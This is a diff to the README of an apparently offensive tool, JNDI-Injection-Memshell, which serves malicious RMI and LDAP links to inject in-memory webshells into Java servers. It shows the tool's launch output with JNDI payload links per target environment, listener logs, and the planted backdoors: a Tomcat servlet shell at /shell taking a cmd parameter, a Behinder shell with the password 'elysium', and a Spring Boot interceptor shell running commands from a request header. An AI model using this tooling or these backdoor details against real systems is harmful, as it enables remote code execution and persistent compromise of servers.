@@ -19,37 +19,46 @@ $ java -jar JNDI-Injection-Memshell-1.0-SNAPSHOT-all.jar
 [COMMAND] >> open /Applications/Calculator.app
 ----------------------------JNDI Links----------------------------
 Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
-rmi://127.0.0.1:1099/qbf3r4
-Target environment(Behinder Servlet Memshell):
-rmi://127.0.0.1:1099/7oufct
-ldap://127.0.0.1:1389/7oufct
-Target environment(Tomcat Servlet Memshell):
-rmi://127.0.0.1:1099/zskyrz
-ldap://127.0.0.1:1389/zskyrz
+rmi://127.0.0.1:1099/cl2cgx
 Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/j5edul
-ldap://127.0.0.1:1389/j5edul
+rmi://127.0.0.1:1099/knlbmx
+ldap://127.0.0.1:1389/knlbmx
+Target environment(Tomcat Servlet Memshell):
+rmi://127.0.0.1:1099/9tc7hk
+ldap://127.0.0.1:1389/9tc7hk
 Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
-rmi://127.0.0.1:1099/jkzrcz
-ldap://127.0.0.1:1389/jkzrcz
+rmi://127.0.0.1:1099/ma0np7
+ldap://127.0.0.1:1389/ma0np7
+Target environment(Springboot Interceptor Memshell):
+rmi://127.0.0.1:1099/fnijcn
+ldap://127.0.0.1:1389/fnijcn
+Target environment(Behinder Servlet Memshell):
+rmi://127.0.0.1:1099/oeczn8
+ldap://127.0.0.1:1389/oeczn8
 
 ----------------------------Server Log----------------------------
-2023-08-25 10:07:14 [JETTYSERVER]>> Listening on 0.0.0.0:8180
-2023-08-25 10:07:14 [RMISERVER]  >> Listening on 0.0.0.0:1099
-2023-08-25 10:07:14 [LDAPSERVER] >> Listening on 0.0.0.0:1389
+2023-08-28 09:06:01 [JETTYSERVER]>> Listening on 0.0.0.0:8180
+2023-08-28 09:06:01 [RMISERVER]  >> Listening on 0.0.0.0:1099
+2023-08-28 09:06:01 [LDAPSERVER] >> Listening on 0.0.0.0:1389
 ```
 
-- Tomcat Memshell
+- Tomcat Servlet Memshell
 
-  - 命令执行内存马：路径/shell，参数cmd
+  - 命令执行Servlet内存马：路径/shell，参数cmd
 
    ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/1.jpg)
 
-- Behinder
+- Behinder Servlet Memshell
 
-  - 冰蝎内存马：路径/shell，密码:elysium
+  - 冰蝎Servlet内存马：路径/shell，密码:elysium
 
   ![](https://raw.githubusercontent.com/MUYU212/JNDI-Injection-Memshell/main/screenshot/2.jpg)
+
+- Springboot interceptor Memshell
+
+  - springboot的拦截器内存马，在request header中的command为入参执行命令
+
+  
 
 ## 待实现
 
